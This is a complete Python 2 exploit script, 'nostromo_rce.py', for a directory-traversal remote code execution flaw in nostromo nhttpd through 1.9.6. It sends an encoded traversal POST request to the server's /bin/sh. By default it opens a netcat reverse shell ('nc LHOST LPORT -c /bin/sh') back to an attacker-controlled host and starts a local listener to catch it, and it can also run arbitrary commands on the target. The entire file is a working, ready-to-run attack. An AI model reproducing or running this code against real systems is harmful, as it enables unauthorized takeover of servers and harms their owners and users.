#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
# ▐ ▄.▄▄ · ▄▄▄▄▄▄▄▄        • ▌ ▄ ·.▄▄▄   ▄▄· ▄▄▄.                                                           #
# •█▌▐█▪     ▐█ ▀.•██  ▀▄ █·▪     ·██ ▐███▪▪     ▀▄ █·▐█ ▌▪▀▄.▀·                                            #
# ▐█▐▐▌ ▄█▀▄ ▄▀▀▀█▄ ▐█.▪▐▀▀▄  ▄█▀▄ ▐█ ▌▐▌▐█· ▄█▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄                                           #
# ██▐█▌▐█▌.▐▌▐█▄▪▐█ ▐█▌·▐█•█▌▐█▌.▐▌██ ██▌▐█▌▐█▌.▐▌▐█•█▌▐███▌▐█▄▄▌                                           #
# ▀▀ █▪ ▀█▄▀▪ ▀▀▀▀  ▀▀▀.▀  ▀ ▀█▄▀▪▀▀  █▪▀▀▀ ▀█▄▀▪.▀  ▀·▀▀▀  ▀▀▀                                             #
# nostromo_rce.py - nighter@nighter.se                                                                      #
#                                                                                                           #
# DATE                                                                                                      #
# 03/04/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to    #
# achieve remote code execution via a crafted HTTP request.                                                 #
#                                                                                                           #
# nighter@nighter.se                                                                                        #
#                                                                                                           #
#############################################################################################################

import socket
import random
import signal
import os
import string
import sys
import time

from multiprocessing import Process


def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response


def exploit(cmd=''):
    
    global URL

    if ':' not in URL[7:]:
        if 'https://' in URL:
            URL = URL.replace('https://', '')
            port = '443'
        else:
            URL = URL.replace('http://', '')
            port = '80'
    else:
        (URL, port) = URL.split(':')

    if len(cmd) == 0:
    	time.sleep(3)
    	print('[+] Exploit')
    	cmd = "nc %s %s -c /bin/sh" % (LHOST, LPORT)

    soc = socket.socket()
    soc.connect((URL, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == '__main__':

    try:
        if len(sys.argv) == 3:

            URL = sys.argv[1]
            COMMAND = sys.argv[2]
            exploit(cmd=COMMAND)
            os._exit(0)
    except:
    	pass

    if len(sys.argv) != 4:
        print("""
 ▐ ▄       .▄▄ · ▄▄▄▄▄▄▄▄        • ▌ ▄ ·.       ▄▄▄   ▄▄· ▄▄▄ .
•█▌▐█▪     ▐█ ▀. •██  ▀▄ █·▪     ·██ ▐███▪▪     ▀▄ █·▐█ ▌▪▀▄.▀·
▐█▐▐▌ ▄█▀▄ ▄▀▀▀█▄ ▐█.▪▐▀▀▄  ▄█▀▄ ▐█ ▌▐▌▐█· ▄█▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██▐█▌▐█▌.▐▌▐█▄▪▐█ ▐█▌·▐█•█▌▐█▌.▐▌██ ██▌▐█▌▐█▌.▐▌▐█•█▌▐███▌▐█▄▄▌
▀▀ █▪ ▀█▄▀▪ ▀▀▀▀  ▀▀▀ .▀  ▀ ▀█▄▀▪▀▀  █▪▀▀▀ ▀█▄▀▪.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./nostromo_rce.py 'http://10.10.10.70' <command>")
        print("EXAMPLE: ./nostromo_rce.py 'http://10.10.10.70' 10.10.14.24 1337\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST = %s" % LHOST)
    print("[+] LPORT = %s" % LPORT)

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)